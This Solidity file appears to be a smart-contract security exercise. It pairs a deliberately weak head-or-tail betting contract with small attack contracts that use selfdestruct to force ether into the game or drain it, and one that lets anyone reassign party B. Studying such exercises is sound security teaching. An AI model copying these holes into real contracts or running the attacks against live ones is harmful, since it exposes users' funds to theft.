//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.13;

//*** Exercice 5 ***//
// You choose Head or Tail and send 1 ETH.
// The next party send 1 ETH and try to guess what you chose.
// If it succeed it gets 2 ETH, else you get 2 ETH.
contract HeadTail {
    address payable public partyA;
    address payable public partyB;
    bytes32 public commitmentA;
    bool public chooseHeadB;
    uint256 public timeB;

    /** @dev Constructor, commit head or tail.
     *  @param _commitmentA is keccak256(abi.encode(chooseHead,randomNumber));
     */
    constructor(bytes32 _commitmentA) payable {
        require(msg.value == 1 ether);

        commitmentA = _commitmentA;
        partyA = payable(msg.sender);
    }

    /** @dev Guess the choice of party A.
     *  @param _chooseHead True if the guess is head, false otherwise.
     */
    function guess(bool _chooseHead) public payable {
        require(msg.value == 1 ether);
        require(partyB == address(0));

        chooseHeadB = _chooseHead;
        timeB = block.timestamp;
        partyB = payable(msg.sender);
    }

    /** @dev Reveal the commited value and send ETH to the winner.
     *  @param _chooseHead True if head was chosen.
     *  @param _randomNumber The random number chosen to obfuscate the commitment.
     */
    function resolve(bool _chooseHead, uint256 _randomNumber) public {
        require(msg.sender == partyA);
        require(
            keccak256(abi.encode(_chooseHead, _randomNumber)) == commitmentA
        );
        require(address(this).balance >= 2 ether);

        if (_chooseHead == chooseHeadB) partyB.transfer(2 ether);
        else partyA.transfer(2 ether);
    }

    /** @dev Time out party A if it takes more than 1 day to reveal.
     *  Send ETH to party B.
     * */
    function timeOut() public {
        require(block.timestamp > timeB + 1 days);
        require(address(this).balance >= 2 ether);
        partyB.transfer(2 ether);
    }
}

// https://hackernoon.com/how-to-hack-smart-contracts-self-destruct-and-solidity
contract HeadTailHack2 {
    HeadTail _game;

    constructor(HeadTail game) {
        _game = game;
    }

    function close() public payable {
        selfdestruct(payable(address(_game)));
    }
}

contract HeadTailChild is HeadTail {
    function updateAddressB(address _address) public {
        partyB = payable(_address);
    }

    constructor(bytes32 _commitmentA) payable HeadTail(_commitmentA) {}
}

contract HeadTailHack is HeadTail {
    constructor(bytes32 _commitmentA) payable HeadTail(_commitmentA) {}

    function close() public payable {
        selfdestruct(payable(msg.sender));
    }
}
